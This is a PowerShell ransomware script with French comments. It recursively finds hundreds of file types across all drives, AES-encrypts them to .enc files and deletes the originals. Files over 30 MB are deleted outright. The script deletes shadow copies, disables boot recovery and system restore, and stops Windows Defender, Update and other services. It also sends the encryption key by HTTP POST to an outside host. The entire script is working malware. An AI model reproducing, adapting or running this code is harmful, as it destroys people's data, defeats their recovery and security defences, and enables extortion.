function Get-Files($drive){
    $files = gci "$($drive.Name)" -Recurse  -ErrorAction SilentlyContinue -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv
    #$files = gci "C:\Users\ydgaygui\" -Recurse  -ErrorAction SilentlyContinue -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv
    return $files
}

function Create-AesManagedObject ($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey(){
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String ($key, $file, $aesManaged, $encryptor){
    $bytes=[System.IO.File]::ReadAllBytes($file);
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

function Get-All-Files($exts){
    $files = @()
    Foreach ($ext in $exts){
        $file = Get-Files $ext
        $files += $file
    }
    return $files
}

function Not-Too-Big ($file, $key, $aesManaged, $encryptor){
    $erroractionPreference = "stop"
    try{
        $encryptedcontent = Encrypt-String $key $file $aesManaged $encryptor
        Set-Content -Path $file'.enc' -Value $encryptedcontent
        Remove-Item –path $file -force
    }
    catch{
        try{
            $encryptedcontent = Encrypt-String $key $file $aesManaged $encryptor
            Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}}
            Set-Content -Path $file'.enc' -Value $encryptedcontent
            Remove-Item –path $file -force
            }
            catch{
                #Write-Host $_.ScriptStackTrace
                #Write-Host $_
            }
    }
}

function Too-Big($file, $key){
    try{
        Remove-Item –path $file -force
    }
    catch{
        try{
            Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}}
            Remove-Item –path $file -force
        }
        catch{}
    }
}

function Encrypt-All($key, $drive, $aesManaged, $encryptor){
    $files = Get-Files $drive
    #Ici séparer les fichiers en plusieurs array
    ##
    ##Ici mettre en place les threads qui feront la boucle en même temps sur leurs liste
    Foreach ($file in $files){
        $($file.FullName)
        $toobig = ((Get-Item $($file.FullName)).length/1MB) -gt 30
        If ($toobig){
            Too-Big $($file.FullName) $key 
        }

        Else{
            Not-Too-Big $($file.FullName) $key $aesManaged $encryptor
        }
    }
}

function Decrypt-All($key){
    $files=gci "$($drive.Name)" -Recurse -Include *.enc
    Foreach ($file in $files){
         $content = Get-Content $file
         $decryptedcontent = Decrypt-String $key $content
         $file = $file -replace ".{4}$"
         Set-Content -Path $file -Value $decryptedcontent
         Remove-Item –path $file'.enc'
    }
}

function main{
    $erroractionPreference="stop"
    try{
        # Remove all snapshots
        gwmi Win32_Shadowcopy|%{if($($_.ClientAccessible) -eq "True"){$_.Delete()}};
         # Stop the Volume Snapshot Service
        spsv vss -ErrorAction SilentlyContinue;
        # Disable the Volume Snapshot Service
        if(((gwmi -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode) -ne "Disabled"){
        set-service vss -StartupType Disabled};
    }
    catch{}
    try{
        # Disable recovery options
        # Disable Startup Repair from trying to start when a problem is detected
        bcdedit /set recoveryenabled No|Out-Null;
    }
    catch{} 
    try {
        # Disable Windows recovery at startup
        bcdedit /set bootstatuspolicy ignoreallfailures|Out-Null; 
    }
    catch {}
    try{
        # Stop and disable the services Wscsvc - WinDefend - Wuauserv - BITS - ERSvc - WerSvc
        spsv Wscsvc -ErrorAction SilentlyContinue;
        if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wscsvc'").StartMode) -ne "Disabled"){
        set-service Wscsvc -StartupType Disabled};
        spsv WinDefend -ErrorAction SilentlyContinue;
        if(((gwmi -Query "Select StartMode From Win32_Service Where Name='WinDefend'").StartMode) -ne "Disabled"){
        set-service WinDefend -StartupType Disabled};
        spsv Wuauserv -ErrorAction SilentlyContinue;
        if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wuauserv'").StartMode) -ne "Disabled"){
        set-service Wuauserv -StartupType Disabled};
        spsv BITS -ErrorAction SilentlyContinue;
        if(((gwmi -Query "Select StartMode From Win32_Service Where Name='BITS'").StartMode) -ne "Disabled"){
        set-service BITS -StartupType Disabled};
        spsv ERSvc -ErrorAction SilentlyContinue;
        if(((gwmi -Query "Select StartMode From Win32_Service Where Name='ERSvc'").StartMode) -ne "Disabled"){
        set-service ERSvc -StartupType Disabled};
        spsv WerSvc -ErrorAction SilentlyContinue;
        if(((gwmi -Query "Select StartMode From Win32_Service Where Name='WerSvc'").StartMode) -ne "Disabled"){
        set-service WerSvc -StartupType Disabled};
    }
    catch{}

    $hklm=2147483650;$hkcu = 2147483649;
    $reg=[WMIClass]"ROOT\DEFAULT:StdRegProv";
    # Disable the security center notifications
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects\{FD6905CE-952F-41F1-9A6F-135D9C6622CC}";
    $reg.DeleteKey($hklm, $key)|out-null;
    # Disable the system restore
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\SystemRestore";
    $reg.CreateKey($hklm, $key)|out-null;
    $reg.SetDWORDValue($hklm, $key, "DisableSR", "1")|out-null;
    # To hide Windows Defender notification icon
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    $reg.DeleteValue($hklm, $key, "WindowsDefender")|out-null;
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run";
    $reg.DeleteValue($hklm, $key, "WindowsDefender")|out-null;
    $key="SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    $reg.DeleteValue($hkcu, $key, "Windows Defender")|out-null;
    $key="SOFTWARE\Policies\Microsoft\Windows Defender";
    #List al the drives in the computer
    $drives=gwmi Win32_LogicalDisk -Filter "DriveType=3 or DriveType=4"|select Name;
    #Créée la clé AES
    $key = Create-AesKey
    #Envoie la clé AES à notre API Web
    try{
        $ok = Invoke-WebRequest -Uri http://192.168.1.28:8080/ -Method POST -Body $key -UseBasicParsing
    }
    catch{}
    #Initialisation de l'AES
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    #Si plusieurs disque, faire un thread par disque 
    foreach ($drive in $drives){
        Encrypt-All $key $drive $aesManaged $encryptor
    }
    $aesManaged.Dispose()
}